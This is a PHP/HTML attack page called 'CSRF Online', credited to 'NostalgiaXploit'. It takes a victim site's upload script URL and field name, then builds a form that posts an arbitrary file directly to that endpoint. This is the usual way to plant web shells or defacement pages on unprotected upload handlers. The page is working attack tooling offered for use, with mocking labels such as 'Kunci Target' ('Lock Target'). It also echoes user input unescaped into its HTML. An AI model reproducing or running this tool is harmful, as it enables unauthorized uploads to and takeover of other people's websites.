<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Online</title>
    <style>
        body {
            background-color: #2c3e50;
            color: white;
            font-family: 'Inconsolata', monospace;
            text-align: center;
        }
        .login-input {
            background-color: #e74c3c;
            color: white;
            border: none;
            cursor: pointer;
            padding: 10px;
            margin-top: 10px;
        }
        .login-input:hover {
            background-color: #c0392b;
        }
        #preloader {
            position: fixed;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8) url('https://media.giphy.com/media/3o7btNeTqNMQb1iLBe/giphy.gif') no-repeat center center;
            display: none;
        }
        #loading {
            display: block;
        }
    </style>
</head>
<body>

<center>
    <img src="http://clipartstation.com/wp-content/uploads/2017/11/garuda-clipart-4.png" alt="Garuda Image">
    <br>
    <font face="Wallpoet" color="white" size="6px">CSRF Online</font><font face="Wallpoet" color="red" size="6px"> ©2018</font><br><br>
    <p>
        <font face="Iceland" size="5px" color="white"><span style="color: red">*** </span> <span style="color: red">NostalgiaXploit </span> <span style="color: red">*** </span>
    </p>

    <form method="post">
        <font face="Inconsolata" color="white"> URL : </font> <font color="red">*******</font>
        <input type="text" name="url" placeholder="https:Target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required>
        <br><br>
        <font face="Inconsolata" color="white"> POST File : </font><font color="red">*</font>  
        <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" required>
        <br><br>
        <input type="submit" name="submit" value="Kunci Target" class="login-input" style='width: 130px; height: 40px;'> 
    </form>

    <?php
    if ($_POST['submit']) {
        $url = $_POST['url'];
        $pf = $_POST['pf'];
        echo "<div id='preloader'>";
        echo "<div id='loading'></div>";
        echo "</div>";
        echo "<div class='content'></div>";
        echo "<br>";
        echo "<font face='Inconsolata' color='red'> $url  Your Target is Already Locked: </font> <font face='Inconsolata' color='white'> Tinggal Dieue </font>";
        echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'>
                <font face='Inconsolata' color='white'> File Anda : </font><font color='red'>***</font>
                <input type='file' name='$pf'>
                <input type='submit' name='submit' value='Croot' class='login-input' style='width: 120px; height: 42px;'>
              </form>";
    }
    ?>

    <script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
    <script type="text/javascript">
    $(window).load(function() {
        $("#content").fadeOut();
        $("#preloader").delay(10).fadeOut("slow");
    });
    </script>
</body>
</html>
